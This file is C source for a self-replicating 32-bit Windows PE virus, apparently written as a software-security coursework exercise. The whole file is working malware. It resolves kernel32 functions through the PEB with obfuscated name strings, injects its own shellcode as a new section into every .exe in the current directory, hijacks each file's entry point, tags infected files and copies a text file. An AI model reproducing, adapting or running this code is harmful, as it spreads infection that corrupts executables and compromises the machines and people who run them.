#include <Windows.h>
#include <winternl.h>
#include <minwindef.h>
#include <minwinbase.h>
#include <winnt.h>

#pragma code_seg(".advance")

//======================================================================
// fileapi.h
typedef HANDLE (WINAPI *__FindFirstFileA) (
    _In_ LPCSTR lpFileName,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindNextFileA) (
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindClose) (
    _Inout_ HANDLE hFindFile
);
typedef HANDLE (WINAPI *__CreateFileA) (
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
);
typedef BOOL (WINAPI *__WriteFile) (
    _In_ HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToWrite,
    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef BOOL (WINAPI *__ReadFile) (
    _In_ HANDLE hFile,
    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToRead,
    _Out_opt_ LPDWORD lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef DWORD (WINAPI *__SetFilePointer) (
    _In_ HANDLE hFile,
    _In_ LONG lDistanceToMove,
    _Inout_opt_ PLONG lpDistanceToMoveHigh,
    _In_ DWORD dwMoveMethod
);
typedef BOOL (WINAPI *__SetEndOfFile) (
    _In_ HANDLE hFile
);
typedef DWORD (WINAPI *__GetFileSize) (
    _In_ HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
);
// handleapi.h
typedef BOOL (WINAPI *__CloseHandle) (
    _In_ _Post_ptr_invalid_ HANDLE hObject
);
//======================================================================

typedef struct SHELL_CODE_SUPER_BLOCK {
    // code info
    PBYTE _shellCode;
    DWORD _JMP_POINT_OFFSET;
    DWORD _CODE_SIZE;
    // function
    __FindFirstFileA _FindFirstFileA;
    __FindNextFileA _FindNextFileA;
    __FindClose _FindClose;
    __CreateFileA _CreateFileA;
    __WriteFile _WriteFile;
    __ReadFile _ReadFile;
    __SetFilePointer _SetFilePointer;
    __SetEndOfFile _SetEndOfFile;
    __GetFileSize _GetFileSize;
    __CloseHandle _CloseHandle;
    // headers
    IMAGE_DOS_HEADER dosHdr;
    IMAGE_FILE_HEADER fileHdr;
    IMAGE_OPTIONAL_HEADER32 optHdr;
    IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
} SCSB;

//======================================================================

#define shellCode sb->_shellCode
#define JMP_POINT_OFFSET sb->_JMP_POINT_OFFSET
#define CODE_SIZE sb->_CODE_SIZE

// #define DEBUG_STATIC // use api static

// #define DEBUG
// #define DEBUG_ABS // use absolute path
// #define DEBUG_ASM // use asm tags

#ifdef DEBUG_ASM
#define ASM_TAG __asm{ xchg bx, bx }
#else
#define ASM_TAG
#endif

#ifdef DEBUG
#include <stdio.h>
#include <string.h>
#endif

#ifndef DEBUG_STATIC
#define FindFirstFileA sb->_FindFirstFileA
#define FindNextFileA sb->_FindNextFileA
#define FindClose sb->_FindClose
#define CreateFileA sb->_CreateFileA
#define WriteFile sb->_WriteFile
#define ReadFile sb->_ReadFile
#define SetFilePointer sb->_SetFilePointer
#define SetEndOfFile sb->_SetEndOfFile
#define GetFileSize sb->_GetFileSize
#define CloseHandle sb->_CloseHandle
#else
#include <fileapi.h>
#include <handleapi.h>
#endif

//======================================================================

typedef struct _IMAGE_EXPORT_ADDRESS_TABLE_ {
    union {
        DWORD dwExportRVA;
        DWORD dwForwarderRVA;
    };
} IMAGE_EXPORT_ADDRESS_TABLE, *PIMAGE_EXPORT_ADDRESS_TABLE;

typedef PCHAR IMAGE_EXPORT_NAME_POINTER ;
typedef PCHAR *PIMAGE_EXPORT_NAME_POINTER;

typedef WORD IMAGE_EXPORT_ORDINAL_TABLE;
typedef WORD *PIMAGE_EXPORT_ORDINAL_TABLE;

//======================================================================

__forceinline int _strcmp(const char *s1, const char *s2) {
    while(*s1 || *s2) {
        if(*s1 != *s2) return *s1 < *s2 ? -1 : 1;
        s1++, s2++;
    }
    return 0;
}

__forceinline DWORD FindFunction(
        PCHAR pcFuncName,
        DWORD DemandModuleBase
    ) {
    // Find address of EXPORT Directory Table
    PIMAGE_DOS_HEADER pDosHdr =  DemandModuleBase;
    PIMAGE_FILE_HEADER pFileHdr = DemandModuleBase
        + pDosHdr->e_lfanew + 0x4; /* 0x4 for signature */
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = (BYTE *)pFileHdr + sizeof(IMAGE_FILE_HEADER);
#ifdef DEBUG
    puts("File Header:");
    for (int j = 0; j < sizeof(IMAGE_FILE_HEADER); j++)
        printf("%02x, ", *((BYTE *)pFileHdr + j));
    printf("\n");

    puts("Optional Header:");
    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 16; j++)
            printf("%02x, ", *((BYTE *)pOptHdr + i * 16 + j));
        printf("\n");
    }
#endif

    PIMAGE_EXPORT_DIRECTORY d = DemandModuleBase
        + pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
#ifdef DEBUG
    printf("ExportTable at: %p, name: %s\n", d, DemandModuleBase + d->Name);
    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 16; j++)
            printf("%02x, ", *((BYTE *)d + i * 16 + j));
        printf("\n");
    }
#endif
    PIMAGE_EXPORT_ADDRESS_TABLE pAddr = DemandModuleBase + d->AddressOfFunctions;
    PIMAGE_EXPORT_NAME_POINTER ppName = DemandModuleBase + d->AddressOfNames;
    PIMAGE_EXPORT_ORDINAL_TABLE pOrd = DemandModuleBase + d->AddressOfNameOrdinals;
    for (SIZE_T i = 0; i < d->NumberOfNames; i++) {
        if (_strcmp(DemandModuleBase + ppName[i], pcFuncName) == 0) {
            // Matched
            WORD ord = pOrd[i];
            DWORD FuncVA = DemandModuleBase + (pAddr + ord)->dwExportRVA;
#ifdef DEBUG
            printf("Found %s at %#x\n", pcFuncName, FuncVA);
#endif
            return FuncVA;
        }
    }
    return 0;
}

__forceinline DWORD FindBase(PWCHAR DemandModuleName, PEB *peb) {
    // Find ImageBase of kernel32.dll
    size_t DemandModuleNameLen = sizeof(DemandModuleName) / sizeof(WCHAR);  
    DWORD DemandModuleBase = 0;
    PPEB_LDR_DATA pLdr = peb->Ldr;
    LIST_ENTRY LdrDataListHead = pLdr->InMemoryOrderModuleList;
    for (PRLIST_ENTRY e = LdrDataListHead.Flink; 1 ; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY Module = CONTAINING_RECORD(
            e,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        
        // Compare name with DemandModuleName
        PWCHAR s = ((UNICODE_STRING *)Module->Reserved4)->Buffer; /* BaseDllName*/
#ifdef DEBUG
        wprintf(L"%lls\n", s);
#endif // DEBUG
        for (int k = 0; k < DemandModuleNameLen; k++) {
            if (s[k] != DemandModuleName[k])
                break;
            if (k == DemandModuleNameLen - 1) {
                // found module
                DemandModuleBase = (DWORD)Module->DllBase;
#ifdef DEBUG
                printf("Found kernel32.dll ImageBase: %#x\n", DemandModuleBase);
#endif // DEBUG
            }
        }
        if (e == LdrDataListHead.Blink) break;
    }
#ifdef DEBUG
    for (int i = 0; i < 4; i++) {
        for (int j = 0; j < 16; j++)
            printf("%02x, ", *(BYTE *)(DemandModuleBase + i * 16 + j));
        printf("\n");
    }
#endif
    return DemandModuleBase;
}

//======================================================================

__forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
#ifdef DEBUG
        puts("Error when set file pointor!");
#endif
        return 1;
    }
    if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
#ifdef DEBUG
        puts("Error when read file!");
#endif
        return 2;
    }
    return 0;
}

__forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
#ifdef DEBUG
        puts("Error when set file pointor!");
#endif
        return 1;
    }
    if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
#ifdef DEBUG
        puts("Error when write file!");
#endif
        return 2;
    }
    return 0;
}
__forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
    if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
#ifdef DEBUG
        puts("Error when set file pointor!");
#endif
        return 1;
    }
    if(SetEndOfFile(hFile) == FALSE) {
#ifdef DEBUG
        puts("Error when modify size!");
#endif
        return 2;
    }
    return 0;
}

//======================================================================

__forceinline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
    HANDLE hFile = CreateFileA(
        name,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    return hFile;
}
__forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
    int err = 0;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Init header pointers...");
#endif DEBUG
    // headers
    /* init in struct SCSB */
    // headers pointer
    PIMAGE_DOS_HEADER pDosHdr = &sb->dosHdr;
    PIMAGE_FILE_HEADER pFileHdr = &sb->fileHdr;
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &sb->optHdr;
    PIMAGE_SECTION_HEADER pLasSecHdr = &sb->lasSecHdr;
    PIMAGE_SECTION_HEADER pNewSecHdr = &sb->newSecHdr;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Parse headers...");
#endif
    // Get DOS Header
    err = ReadOffset(
        sb, hFile, 0, FILE_BEGIN, 
        pDosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    if(err) return -1;
    // Check infected
    if(pDosHdr->e_res[0] == 0x1234) {
#ifdef DEBUG
        puts("Error: Target has been infected!");
#endif
        return 1;
    }
    // Check Signature
    DWORD pe00;
    err = ReadOffset(
        sb, hFile, pDosHdr->e_lfanew, FILE_BEGIN,
        (PVOID)&pe00, sizeof(DWORD)
    );
    if(err) return -1;
    if(pe00 != 0x00004550) {
#ifdef DEBUG
        puts("Error: Not a pe file!");
#endif
        return 2;
    }
    // Get File Header
    err = ReadOffset(
        sb, hFile, 0, FILE_CURRENT, 
        pFileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    if(err) return -1;
    // Get Optional Header
    err = ReadOffset(
        sb, hFile, 0, FILE_CURRENT, 
        pOptHdr, 
        /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
        sizeof(IMAGE_OPTIONAL_HEADER32) 
    );
    if(err) return -1;
    if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
#ifdef DEBUG
        puts("Error: Not a 32 bits exe!");
#endif
        return 3;
    }
    // Check Headers Space
    long currentSize = \
        pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
        + pDosHdr->e_lfanew + 0x4 \
        + sizeof(IMAGE_FILE_HEADER) \
        + pFileHdr->SizeOfOptionalHeader;
    long alignSize = pOptHdr->SizeOfHeaders;
    if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
#ifdef DEBUG
        puts("Error: No space to insert a new sections!");
#endif
        return 4;
    }
    // Get Last Section Header
    err = ReadOffset(
        sb, hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
        pLasSecHdr, sizeof(IMAGE_SECTION_HEADER)
    );
    if(err) return -1;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Calc address...");
#endif
    // Get align
    long fileAlign = pOptHdr->FileAlignment;
    long secAlign = pOptHdr->SectionAlignment; 
    // Set old entry VA
#ifdef DEBUG
    printf("%p %d %d\n", shellCode, JMP_POINT_OFFSET, CODE_SIZE);
#endif
    long oldVA = pOptHdr->AddressOfEntryPoint;
    long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
    // *jmpPoint = oldVA; !!! you can't exit readonly mem 
    // Calc New Section raw
    long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
    // Calc New Section rva 
    long lasVirSize = pLasSecHdr->Misc.VirtualSize;
    if(lasVirSize % secAlign != 0) lasVirSize = (lasVirSize / secAlign + 1) * secAlign;
    long rvaNewSec = pLasSecHdr->VirtualAddress + lasVirSize;
    // Calc New Section raw size
    long raw_size = CODE_SIZE;
    if(CODE_SIZE % fileAlign != 0) raw_size = (CODE_SIZE / fileAlign + 1) * fileAlign;
    // Calc New Section image size
    int vir_size = CODE_SIZE;
    if(CODE_SIZE % secAlign != 0) vir_size = (CODE_SIZE / secAlign + 1) * secAlign;
    // Set New Section Header
    char *sName = pNewSecHdr->Name;
    sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
    sName[3] = sName[4] = sName[5] = sName[6] = sName[7] = 0; /* Something not null when O2*/
    pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
    pNewSecHdr->VirtualAddress = rvaNewSec;
    pNewSecHdr->SizeOfRawData = raw_size;
    pNewSecHdr->PointerToRawData = rawNewSec;
    pNewSecHdr->PointerToRelocations = 0;
    pNewSecHdr->PointerToLinenumbers = 0;
    pNewSecHdr->NumberOfRelocations = 0;
    pNewSecHdr->NumberOfLinenumbers = 0;
    pNewSecHdr->Characteristics = \
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_ALIGN_32BYTES | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
    // Set Infected tag
    pDosHdr->e_res[0] = 0x1234;
    // Fix File Header
    pFileHdr->NumberOfSections++;
    // Fix Optional Header
    pOptHdr->AddressOfEntryPoint = rvaNewSec;
    pOptHdr->SizeOfImage = rvaNewSec + vir_size;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Save changing...");
#endif
    // Saved Dos Header
    err = WriteOffset(
        sb, hFile, 0, FILE_BEGIN,
        pDosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    if(err) return -1;
    // Saved File Header
    err = WriteOffset(
        sb, hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
        pFileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    if(err) return -1;
    // Saved Optional Header
    err = WriteOffset(
        sb, hFile, 0, FILE_CURRENT,
        pOptHdr,
        sizeof(IMAGE_OPTIONAL_HEADER32)
    );
    if(err) return -1;
    // Saved New Section Header
    err = WriteOffset(
        sb, hFile, currentSize, FILE_BEGIN,
        pNewSecHdr,
        sizeof(IMAGE_SECTION_HEADER)
    );
    if(err) return -1;
    // Saved New Section
    err = WriteOffset(
        sb, hFile, rawNewSec, FILE_BEGIN,
        shellCode, CODE_SIZE
    );
    if(err) return -1;
    // Fix jmp point
    err = WriteOffset(
        sb, hFile, rawNewSec + JMP_POINT_OFFSET, FILE_BEGIN,
        &oldVA, sizeof(DWORD)
    );
    if(err) return -1;
    // Alignment
    err = SetFileSize(sb, hFile, rawNewSec + raw_size);
    if(err) return -1;
//----------------------------------------------------------------------
    return 0;
}

//======================================================================

__forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
    // Get Module Base
    WCHAR DemandModuleName[13] = {L'K', L'E', L'R', L'N', L'E', L'L',
        L'3', L'2', L'.', L'D', L'L', L'L', 0};
    DWORD DemandModuleBase = FindBase(DemandModuleName, peb);
    // Function Names
    CHAR sFindFirstFileA[15] = {'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', 0};
    CHAR sFindNextFileA[14] = {'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'A', 0};
    CHAR sFindClose[10] = {'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', 0};
    CHAR sCreateFileA[12] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0};
    CHAR sWriteFile[10] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0};
    CHAR sReadFile[9] = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0};
    CHAR sSetFilePointer[15] = {'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 0};
    CHAR sSetEndOfFile[13] = {'S', 'e', 't', 'E', 'n', 'd', 'O', 'f', 'F', 'i', 'l', 'e', 0};
    CHAR sGetFileSize[12] = {'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0};
    CHAR sCloseHandle[12] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    // Get Functions
    sb->_FindFirstFileA = (__FindFirstFileA)FindFunction(sFindFirstFileA, DemandModuleBase);
    sb->_FindNextFileA = (__FindNextFileA)FindFunction(sFindNextFileA, DemandModuleBase);
    sb->_FindClose = (__FindClose)FindFunction(sFindClose, DemandModuleBase);
    sb->_CreateFileA = (__CreateFileA)FindFunction(sCreateFileA, DemandModuleBase);
    sb->_WriteFile = (__WriteFile)FindFunction(sWriteFile, DemandModuleBase);
    sb->_ReadFile = (__ReadFile)FindFunction(sReadFile, DemandModuleBase);
    sb->_SetFilePointer = (__SetFilePointer)FindFunction(sSetFilePointer, DemandModuleBase);
    sb->_SetEndOfFile = (__SetEndOfFile)FindFunction(sSetEndOfFile, DemandModuleBase);
    sb->_GetFileSize = (__GetFileSize)FindFunction(sGetFileSize, DemandModuleBase);
    sb->_CloseHandle = (__CloseHandle)FindFunction(sCloseHandle, DemandModuleBase);
}

//======================================================================

__forceinline void ShellCodeMain(SCSB *sb) {
    // find exe in cwd
#ifdef DEBUG_ABS
    CHAR search[58] = {'D', ':', '\\', '_', '_', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '_', 'S', 'e', 'c', '_', '_', '\\', 'P', 'E', '_', 'V', 'i', 'r', 'u', 's', '\\', 'e', 'x', 'a', 'm', 'p', 'l', 'e', 's', '\\', 't', 'e', 's', 't', '\\', 't', 'e', 's', 't', '_', 'd', 'i', 'r', '\\', '*', '.', 'e', 'x', 'e', 0};
#else
    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
#endif
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search, &findData);
    if(hFind == INVALID_HANDLE_VALUE) return;
    // iterate files
    LPWIN32_FIND_DATAA lpFindData = &findData;
    do {
#ifdef DEBUG
        puts(lpFindData->cFileName);
#endif
        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
        if(hf == NULL) continue;
        InfectTarget(sb, hf);
        CloseHandle(hf);
    } while(FindNextFileA(hFind, lpFindData));
    FindClose(hFind);
    return;
}

//======================================================================

#define MAX_SIZE 128

__forceinline void copy_txt(SCSB *sb) {
    // find an text file
    char textSrc[6] = {'*', '.', 't', 'x', 't', 0};
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(textSrc, &findData);
    if(hFind == INVALID_HANDLE_VALUE) return;
    // open target and close find
    HANDLE hf1 = CreateFileA(
        findData.cFileName, GENERIC_READ,
        0, NULL, 
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if(hf1 == NULL) {
        FindClose(hFind);
        return;
    }
    // open target2
    char textDst[18] = {'2', '0', '2', '0', '3', '0', '2', '1', '8', '1', '0', '3', '2', '.', 't', 'x', 't', 0};
    HANDLE hf2 = CreateFileA(
        textDst, GENERIC_WRITE,
        0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE,
        NULL
    );
    if(hf1 == NULL) {
        CloseHandle(hf1);
        FindClose(hFind);
        return;
    }
    // get file size
    DWORD siz = GetFileSize(hf1, NULL);
    BYTE buf[MAX_SIZE];
    while(siz > 0) {
        DWORD csiz = siz > MAX_SIZE ? MAX_SIZE : siz;
        if(ReadFile(hf1, buf, csiz, NULL, NULL) == FALSE) {
            CloseHandle(hf2);
            CloseHandle(hf1);
            FindClose(hFind);
        }
        if(WriteFile(hf2, buf, csiz, NULL, NULL) == FALSE) {
            CloseHandle(hf2);
            CloseHandle(hf1);
            FindClose(hFind);
        }
        siz -= csiz;
    }
    CloseHandle(hf2);
    CloseHandle(hf1);
    FindClose(hFind);
    return;
}

//======================================================================

#ifdef DEBUG_ASM
#define STACK_OFFSET 0xA
#else
#define STACK_OFFSET 0x9
#endif

void ShellCode() {
__code_start:
    ASM_TAG
#ifdef DEBUG
    puts("In Shell Code!");
#endif
    SCSB super_block;
    SCSB *sb = &super_block;
    PPEB peb;
    PBYTE imageBase;
    // get peb
    __asm {
        mov eax, fs:[30h];
        mov peb, eax
    }
    // get imageBase
    imageBase = (PBYTE)peb->Reserved3[1];
    // Get Code info
    PBYTE codeAdr;
    DWORD codeSize, jmpPoint;
    __asm {
        mov eax, __code_end
        sub eax, __code_start
        mov codeSize, eax
        mov eax, __jmp_point
        sub eax, __code_start
        add eax, 1
        mov jmpPoint, eax
    }
    // for shellcode, codeRva = entryRva
    codeAdr = (PBYTE) *(DWORD *)(imageBase + 0x3C); 
    codeAdr = codeAdr + (DWORD)imageBase;// optHdr
    codeAdr = *(DWORD *)(codeAdr + 0x28); // entry rva
    codeAdr = codeAdr + (DWORD)imageBase; 
    sb->_shellCode = codeAdr;
    sb->_CODE_SIZE = codeSize + STACK_OFFSET; // 0x9 is stack pointer operations
    sb->_JMP_POINT_OFFSET = jmpPoint + STACK_OFFSET;
#ifdef DEBUG
    printf("Base:%#p Codeinfo: %#p %d %d\n", imageBase, codeAdr, codeSize, jmpPoint);
#endif
    // Get funtion pointer
    GetAllFunc(peb, sb);
    // Start infecting
    ShellCodeMain(sb);
    // copyFile
    copy_txt(sb);
#ifdef DEBUG
    printf("ss: %#p\n", imageBase);
#endif
    // Return back
    __asm {
__jmp_point:
        mov eax, 0x0
        add eax, imageBase
        cmp eax, imageBase
        je __code_end
        jmp eax
    }
    ASM_TAG
__code_end:
    return;
}